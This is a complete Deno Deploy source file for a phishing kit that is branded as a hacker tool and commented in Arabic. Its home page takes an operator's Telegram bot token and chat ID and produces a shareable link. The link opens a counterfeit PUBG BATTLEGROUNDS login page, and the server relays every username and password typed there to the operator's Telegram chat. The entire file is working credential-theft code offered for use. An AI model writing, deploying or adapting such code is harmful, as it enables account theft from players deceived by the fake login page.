// ============================================
//  PUBG TOOL - Deno Deploy
//  أداة تسجيل دخول مع بوت تيليجرام
// ============================================

const CHANNEL_URL = "https://t.me/mh77748nfjbmh";
const BRAND_NAME = "الهكر الأسود";

// KV (تخزين مدمج في Deno Deploy)
const kv = await Deno.openKv();

// ============================================
//  المعالج الرئيسي
// ============================================
async function handleRequest(request: Request): Promise<Response> {
  const url = new URL(request.url);
  const path = url.pathname;

  const corsHeaders = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
  };

  if (request.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  // ============ الصفحة الرئيسية ============
  if (path === "/") {
    return new Response(getHomePage(), {
      headers: { "Content-Type": "text/html; charset=utf-8" },
    });
  }

  // ============ API: إنشاء رابط ============
  if (path === "/api/create" && request.method === "POST") {
    try {
      const data = await request.json();
      const token = String(data.token || "").trim();
      const chatId = String(data.chat_id || "").trim();

      if (!token || !chatId) {
        return json({ ok: false, msg: "أكمل البيانات" }, 400, corsHeaders);
      }

      // تحقق من التوكن
      try {
        const test = await fetch(`https://api.telegram.org/bot${token}/getMe`);
        if (!test.ok) {
          return json({ ok: false, msg: "توكن البوت غير صحيح" }, 400, corsHeaders);
        }
      } catch {
        return json({ ok: false, msg: "تعذر التحقق من التوكن" }, 400, corsHeaders);
      }

      const id = generateId();

      await kv.set(["user", id], { token, chat_id: chatId, created: Date.now() });

      const userUrl = url.origin + "/u/" + id;
      return json({ ok: true, url: userUrl, id }, 200, corsHeaders);
    } catch (e) {
      return json({ ok: false, msg: String(e) }, 500, corsHeaders);
    }
  }

  // ============ صفحة المستخدم ============
  if (path.startsWith("/u/")) {
    const id = path.slice(3);
    const entry = await kv.get(["user", id]);

    if (!entry.value) {
      return new Response("❌ رابط غير صالح أو منتهي", { status: 404 });
    }

    return new Response(getLoginPage(id), {
      headers: { "Content-Type": "text/html; charset=utf-8" },
    });
  }

  // ============ API: تسجيل الدخول ============
  if (path.startsWith("/api/login/") && request.method === "POST") {
    const id = path.slice("/api/login/".length);
    try {
      const data = await request.json();
      const user = String(data.user || "").trim();
      const pass = String(data.pass || "").trim();

      if (!user || !pass) {
        return json({ ok: false, msg: "بيانات ناقصة" }, 400, corsHeaders);
      }

      const entry = await kv.get(["user", id]);
      if (!entry.value) {
        return json({ ok: false, msg: "رابط غير صالح" }, 404, corsHeaders);
      }

      const { token, chat_id } = entry.value as { token: string; chat_id: string };

      const text = `🔐 تسجيل دخول جديد - PUBG
━━━━━━━━━━━━━━━━━━
👤 المستخدم: ${user}
🔑 كلمة المرور: ${pass}
🕒 الوقت: ${new Date().toLocaleString("ar-EG")}
━━━━━━━━━━━━━━━━━━`;

      const tgRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text }),
      });

      if (!tgRes.ok) {
        return json({ ok: false, msg: "فشل الإرسال" }, 500, corsHeaders);
      }

      return json({ ok: true }, 200, corsHeaders);
    } catch (e) {
      return json({ ok: false, msg: String(e) }, 500, corsHeaders);
    }
  }

  return new Response("Not Found", { status: 404 });
}

// ============================================
//  أدوات مساعدة
// ============================================
function json(obj: unknown, status: number, headers: Record<string, string>): Response {
  return new Response(JSON.stringify(obj), {
    status,
    headers: { "Content-Type": "application/json", ...headers },
  });
}

function generateId(): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let id = "";
  for (let i = 0; i < 8; i++) {
    id += chars[Math.floor(Math.random() * chars.length)];
  }
  return id;
}

// ============================================
//  الشعار SVG
// ============================================
function getLogo(): string {
  return `
    <div class="brand-logo">
      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" stop-color="#00d4ff"/>
            <stop offset="50%" stop-color="#ffffff"/>
            <stop offset="100%" stop-color="#0066ff"/>
          </linearGradient>
        </defs>
        <circle cx="50" cy="50" r="48" fill="none" stroke="url(#grad)" stroke-width="2"/>
        <text x="50" y="68" font-family="Arial Black, sans-serif" font-size="48"
              font-weight="900" text-anchor="middle" fill="url(#grad)">H</text>
      </svg>
    </div>
  `;
}

// ============================================
//  الصفحة الرئيسية
// ============================================
function getHomePage(): string {
  return `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${BRAND_NAME} - توليد رابط التسجيل</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Teko:wght@500;700&display=swap" rel="stylesheet">
<style>
  *{ box-sizing:border-box; }
  body{ font-family:'Cairo',sans-serif; background:#000; color:#e9e9e9;
        display:grid; place-items:center; min-height:100vh; margin:0; padding:20px;
        background-image:
          radial-gradient(circle at 50% 30%, rgba(0,212,255,.08), transparent 50%),
          radial-gradient(circle at 50% 70%, rgba(0,102,255,.05), transparent 50%); }
  .box{ background:rgba(10,12,15,.95); border:1px solid #00d4ff;
        border-radius:12px; padding:28px; width:100%; max-width:460px;
        box-shadow:0 0 50px rgba(0,212,255,.25); }
  .brand-header{ text-align:center; margin-bottom:20px; }
  .brand-logo{ width:90px; height:90px; margin:0 auto 10px;
        filter:drop-shadow(0 0 20px rgba(0,212,255,.6)); }
  .brand-logo svg{ width:100%; height:100%; }
  .brand-name{ font-family:'Teko',sans-serif; font-size:36px; letter-spacing:4px;
        background:linear-gradient(180deg,#ffffff,#00d4ff);
        -webkit-background-clip:text; background-clip:text; color:transparent;
        font-weight:700; line-height:1; margin:0; }
  .brand-sub{ font-size:11px; letter-spacing:4px; color:#7a8894;
        margin-top:2px; margin-bottom:16px; }
  .channel-btn{ display:inline-flex; align-items:center; gap:8px;
        background:linear-gradient(180deg,#00d4ff,#0088cc); color:#000;
        padding:9px 18px; border-radius:8px; text-decoration:none;
        font-weight:700; font-size:13px; transition:.25s;
        box-shadow:0 0 20px rgba(0,212,255,.4); }
  .channel-btn:hover{ transform:translateY(-2px);
        box-shadow:0 0 30px rgba(0,212,255,.7); }
  h1{ color:#00d4ff; text-align:center; margin-top:20px;
      font-family:'Teko',sans-serif; letter-spacing:3px; font-size:26px; }
  .hint{ font-size:13px; color:#8b929c; line-height:1.7; margin-bottom:20px;
         background:#0d1117; padding:14px; border-radius:8px;
         border-left:3px solid #00d4ff; }
  .hint b{ color:#00d4ff; }
  label{ display:block; margin-top:14px; font-size:13px; color:#00d4ff; font-weight:600; }
  input{ width:100%; padding:12px; margin-top:6px; border-radius:8px;
         border:1px solid #333c47; background:#0d1117; color:#fff;
         font-size:14px; font-family:inherit; transition:.25s; }
  input:focus{ outline:none; border-color:#00d4ff;
         box-shadow:0 0 0 3px rgba(0,212,255,.15); }
  button{ width:100%; padding:14px; margin-top:20px; border:none; border-radius:8px;
          background:linear-gradient(180deg,#00d4ff,#0088cc); color:#000;
          font-weight:bold; cursor:pointer; font-size:16px;
          font-family:inherit; transition:.25s; }
  button:hover{ filter:brightness(1.15); transform:translateY(-1px);
          box-shadow:0 0 25px rgba(0,212,255,.6); }
  button:disabled{ opacity:.6; cursor:wait; }
  .msg{ text-align:center; margin-top:14px; font-size:14px; min-height:20px; }
  .result{ margin-top:20px; background:#0d1117; padding:16px; border-radius:8px;
           border:1px dashed #00d4ff; display:none; }
  .result.show{ display:block; }
  .result label{ color:#00d4ff; margin-top:0; }
  .result input{ background:#1a1f26; color:#00d4ff; font-family:monospace; }
  .result button{ background:linear-gradient(180deg,#00d4ff,#0088cc); color:#000;
           margin-top:10px; padding:10px; }
  .step{ font-size:12px; color:#8b929c; margin-top:10px; line-height:1.6; }
  .step b{ color:#00d4ff; }
  .footer{ text-align:center; margin-top:20px; padding-top:16px;
        border-top:1px solid #1a1f26; font-size:11px; color:#5d646e; }
  .footer a{ color:#00d4ff; text-decoration:none; }
</style>
</head>
<body>
  <div class="box">
    <div class="brand-header">
      ${getLogo()}
      <h2 class="brand-name">${BRAND_NAME}</h2>
      <div class="brand-sub">HACKER TOOLS</div>
      <a href="${CHANNEL_URL}" target="_blank" class="channel-btn">
        📢 قناتي على تيليجرام
      </a>
    </div>

    <h1>🎮 توليد رابط PUBG</h1>

    <div class="hint">
      <b>كيف تستخدم الأداة؟</b><br>
      1. أنشئ بوت تيليجرام من @BotFather<br>
      2. احصل على <b>TOKEN</b><br>
      3. احصل على <b>Chat ID</b><br>
      4. أدخلهم هنا → اضغط "توليد رابط"<br>
      5. انسخ الرابط وشاركه مع زوارك
    </div>

    <label>TOKEN البوت</label>
    <input id="token" type="text" placeholder="123456:ABC-DEF..." autocomplete="off">

    <label>Chat ID</label>
    <input id="chat" type="text" placeholder="123456789" autocomplete="off">

    <button id="btn" onclick="create()">🔗 توليد رابط التسجيل</button>
    <div class="msg" id="msg"></div>

    <div class="result" id="result">
      <label>✅ رابطك الخاص - انسخه وشاركه:</label>
      <input id="userUrl" type="text" readonly onclick="this.select()">
      <button onclick="copy()">📋 نسخ الرابط</button>
      <div class="step">
        <b>هذا رابطك أنت فقط.</b> كل زائر يسجل فيه → تجيك رسالته في بوتك.
      </div>
    </div>

    <div class="footer">
      تطوير <a href="${CHANNEL_URL}" target="_blank">${BRAND_NAME}</a> © 2025
    </div>
  </div>
<script>
  const btn = document.getElementById("btn");
  const msg = document.getElementById("msg");
  const result = document.getElementById("result");

  async function create(){
    const token = document.getElementById("token").value.trim();
    const chat = document.getElementById("chat").value.trim();

    if (!token || !chat) {
      msg.textContent = "أكمل الحقول";
      msg.style.color = "#ff6b6b"; return;
    }

    btn.disabled = true;
    btn.textContent = "⏳ جارٍ التوليد...";
    msg.textContent = "";

    try {
      const r = await fetch("/api/create", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token, chat_id: chat })
      });
      const d = await r.json();
      if (d.ok) {
        document.getElementById("userUrl").value = d.url;
        result.classList.add("show");
        msg.textContent = "✅ تم توليد رابطك بنجاح";
        msg.style.color = "#00d4ff";
      } else {
        msg.textContent = "❌ " + (d.msg || "فشل");
        msg.style.color = "#ff6b6b";
      }
    } catch (e) {
      msg.textContent = "❌ خطأ: " + e.message;
      msg.style.color = "#ff6b6b";
    } finally {
      btn.disabled = false;
      btn.textContent = "🔗 توليد رابط التسجيل";
    }
  }

  function copy(){
    const inp = document.getElementById("userUrl");
    inp.select();
    document.execCommand("copy");
    msg.textContent = "✅ تم نسخ الرابط";
    msg.style.color = "#00d4ff";
  }
</script>
</body>
</html>`;
}

// ============================================
//  صفحة تسجيل الدخول PUBG
// ============================================
function getLoginPage(userId: string): string {
  return `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>تسجيل الدخول | BATTLEGROUNDS</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Teko:wght@500;600;700&display=swap" rel="stylesheet">
<style>
  :root{ --gold:#f0a500; --gold-2:#ffc23c; --gold-3:#b87400; --panel:rgba(17,20,25,.92); --txt:#e9e9e9; --muted:#8b929c; --cut:26px; }
  *{ margin:0; padding:0; box-sizing:border-box; }
  html,body{ height:100%; }
  body{ font-family:'Cairo',sans-serif; background:#0a0c0f; color:var(--txt);
        display:grid; place-items:center; overflow:hidden; }
  body::before{ content:""; position:fixed; inset:0;
    background:radial-gradient(circle at 50% 45%, rgba(240,165,0,.13), transparent 55%),
               radial-gradient(circle at 50% 50%, #151a21 0%, #05070a 100%); }
  body::after{ content:""; position:fixed; inset:0; pointer-events:none;
    background-image:repeating-linear-gradient(0deg, rgba(255,255,255,.03) 0 1px, transparent 1px 3px);
    opacity:.5; }
  .wrap{ position:relative; z-index:2; filter:drop-shadow(0 25px 50px rgba(0,0,0,.75));
         animation:rise .7s cubic-bezier(.2,.8,.2,1) both; }
  @keyframes rise{ from{opacity:0;transform:translateY(26px);} to{opacity:1;transform:translateY(0);} }
  .card{ width:min(410px,92vw); padding:1px;
         background:linear-gradient(150deg,var(--gold) 0%,rgba(240,165,0,.08) 30%,
                    rgba(240,165,0,.08) 70%,var(--gold) 100%);
         clip-path:polygon(0 0,calc(100% - var(--cut)) 0,100% var(--cut),100% 100%,var(--cut) 100%,0 calc(100% - var(--cut))); }
  .card-in{ background:var(--panel); backdrop-filter:blur(10px); padding:38px 34px 30px;
            clip-path:polygon(0 0,calc(100% - 25px) 0,100% 25px,100% 100%,25px 100%,0 calc(100% - 25px)); }
  .logo{ font-family:'Teko',sans-serif; font-size:56px; font-weight:700; line-height:.9;
         letter-spacing:6px; text-align:center;
         background:linear-gradient(180deg,#fff4d8,var(--gold-2) 45%,var(--gold-3));
         -webkit-background-clip:text; background-clip:text; color:transparent;
         filter:drop-shadow(0 0 20px rgba(240,165,0,.45)); }
  .sub{ text-align:center; font-size:11px; letter-spacing:6px; color:var(--muted);
        margin-top:2px; margin-bottom:20px; }
  .divider{ display:flex; align-items:center; gap:12px; font-size:12px; font-weight:600;
            letter-spacing:1px; color:var(--muted); margin-bottom:22px; }
  .divider::before,.divider::after{ content:""; flex:1; height:1px;
            background:linear-gradient(90deg,transparent,rgba(240,165,0,.55),transparent); }
  .field{ margin-bottom:16px; }
  .field label{ display:block; font-size:11px; font-weight:700; letter-spacing:1.5px;
                color:var(--gold-2); margin-bottom:7px; }
  .field input{ width:100%; padding:13px 16px; font-family:inherit; font-size:15px; color:#fff;
                background:rgba(255,255,255,.04); border:1px solid rgba(255,255,255,.12);
                border-inline-start:3px solid var(--gold); outline:none; transition:.25s; }
  .field input:focus{ border-color:rgba(240,165,0,.6); border-inline-start-color:var(--gold-2);
                background:rgba(240,165,0,.06);
                box-shadow:0 0 0 3px rgba(240,165,0,.12),inset 0 0 22px rgba(240,165,0,.12); }
  .btn{ width:100%; padding:15px; font-family:inherit; font-size:16px; font-weight:800;
        letter-spacing:2px; color:#1a1206; background:linear-gradient(180deg,var(--gold-2),var(--gold));
        border:none; cursor:pointer; transition:.25s;
        clip-path:polygon(0 0,calc(100% - 15px) 0,100% 15px,100% 100%,15px 100%,0 calc(100% - 15px)); }
  .btn:hover{ filter:brightness(1.1); box-shadow:0 0 28px rgba(240,165,0,.5); }
  .btn:disabled{ opacity:.6; cursor:wait; }
  .foot{ display:flex; align-items:center; justify-content:center; gap:7px;
         margin-top:20px; font-size:11px; color:var(--muted); }
  .dot{ width:7px; height:7px; border-radius:50%; background:#3ddc84;
        box-shadow:0 0 10px #3ddc84; animation:pulse 1.6s infinite; }
  @keyframes pulse{ 0%,100%{opacity:1;} 50%{opacity:.35;} }
</style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div class="card-in">
        <div class="logo">PUBG</div>
        <div class="sub">BATTLEGROUNDS</div>
        <div class="divider"><span>تسجيل الدخول</span></div>
        <form id="loginForm" novalidate>
          <div class="field">
            <label for="user">اسم المستخدم</label>
            <input id="user" type="text" placeholder="أدخل اسم المستخدم" required>
          </div>
          <div class="field">
            <label for="pass">كلمة المرور</label>
            <input id="pass" type="password" placeholder="••••••••" required>
          </div>
          <button class="btn" type="submit">دخول</button>
        </form>
        <div class="foot">
          <span class="dot"></span>
          <span>الخادم متصل — الإصدار 1.0.0</span>
        </div>
      </div>
    </div>
  </div>
  <script>
    const USER_ID = "${userId}";
    const form = document.getElementById('loginForm');
    const btn = form.querySelector('.btn');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const user = document.getElementById('user').value.trim();
      const pass = document.getElementById('pass').value.trim();
      if (!user || !pass) {
        btn.textContent = 'أكمل البيانات';
        btn.style.background = 'linear-gradient(180deg,#ff7a7a,#d63b3b)';
        setTimeout(() => { btn.textContent = 'دخول'; btn.style.background = ''; }, 1200);
        return;
      }
      btn.disabled = true;
      btn.textContent = 'جارٍ التحقق...';
      try {
        const r = await fetch('/api/login/' + USER_ID, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user, pass })
        });
        const d = await r.json();
        if (d.ok) {
          btn.textContent = '✅ تم التسجيل';
          btn.style.background = 'linear-gradient(180deg,#3ddc84,#2aa865)';
        } else { throw new Error(d.msg || 'فشل'); }
      } catch (err) {
        btn.textContent = '❌ ' + (err.message || 'فشل');
        btn.style.background = 'linear-gradient(180deg,#ff7a7a,#d63b3b)';
      } finally {
        setTimeout(() => {
          btn.disabled = false;
          btn.textContent = 'دخول';
          btn.style.background = '';
        }, 1800);
      }
    });
  </script>
</body>
</html>`;
}

// ============================================
//  نقطة الدخول
// ============================================
Deno.serve(handleRequest);
